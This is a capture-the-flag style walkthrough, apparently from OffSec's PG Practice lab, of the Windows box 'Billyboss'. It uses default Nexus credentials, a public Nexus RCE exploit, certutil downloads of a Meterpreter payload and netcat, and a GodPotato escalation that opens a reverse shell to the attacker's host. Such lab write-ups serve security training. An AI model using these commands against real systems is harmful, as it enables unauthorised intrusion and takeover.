###### tags: `Offsec` `PG Practice` `Intermediate` `Windows`

# Billyboss
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.208.61 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.208.61:21
Open 192.168.208.61:80
Open 192.168.208.61:135
Open 192.168.208.61:139
Open 192.168.208.61:445
Open 192.168.208.61:5040
Open 192.168.208.61:7680
Open 192.168.208.61:8081
Open 192.168.208.61:49664
Open 192.168.208.61:49665
Open 192.168.208.61:49666
Open 192.168.208.61:49667
Open 192.168.208.61:49668
Open 192.168.208.61:49669

PORT      STATE SERVICE       REASON  VERSION
21/tcp    open  ftp           syn-ack Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-cors: HEAD GET POST PUT DELETE TRACE OPTIONS CONNECT PATCH
|_http-title: BaGet
|_http-favicon: Unknown favicon MD5: 8D9ADDAFA993A4318E476ED8EB0C8061
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
5040/tcp  open  unknown       syn-ack
7680/tcp  open  pando-pub?    syn-ack
8081/tcp  open  http          syn-ack Jetty 9.4.18.v20190429
|_http-favicon: Unknown favicon MD5: 9A008BECDE9C5F250EDAD4F00E567721
|_http-server-header: Nexus/3.21.0-05 (OSS)
| http-robots.txt: 2 disallowed entries 
|_/repository/ /service/
|_http-title: Nexus Repository Manager
| http-methods: 
|_  Supported Methods: GET HEAD
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

不知道為什麼需要通靈??，用`nexus/nexus`可登入，下載[edb-49385](https://www.exploit-db.com/exploits/49385)，改裡面的command並開好nc，看http server有沒有成功下載
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp445 

URL='http://192.168.208.61:8081'
CMD='certutil.exe -urlcache -f http://192.168.45.237/met_445.exe met_445.exe'
USERNAME='nexus'
PASSWORD='nexus'

┌──(kali㉿kali)-[~/pgplay]
└─$ python3 49385.py 
```

有成功下載再改command
```
URL='http://192.168.208.61:8081'
CMD='met_445.exe'
USERNAME='nexus'
PASSWORD='nexus'

┌──(kali㉿kali)-[~/pgplay]
└─$ python3 49385.py 
```

等反彈可在`C:\Users\nathan\Desktop`得local.txt
```
C:\Users\nathan\Desktop>type local.txt
fc8941b87a81c26fbc15a3e6c3c2a86e
```

`whoami`
```
C:\Users\nathan\Desktop>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

`Godpotato`，在`C:\Users\Administrator\Desktop`得proof.txt
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp139

C:\Users\nathan\Desktop>certutil.exe -urlcache -f http://192.168.45.237/GodPotato-NET4.exe GodPotato.exe

C:\Users\nathan\Desktop>certutil.exe -urlcache -f http://192.168.45.237/nc.exe nc.exe

C:\Users\nathan\Desktop>GodPotato.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.45.237 139"

C:\Users\Administrator\Desktop>type proof.txt
498dd7e6c2e3f51d0591837fee8fcced
```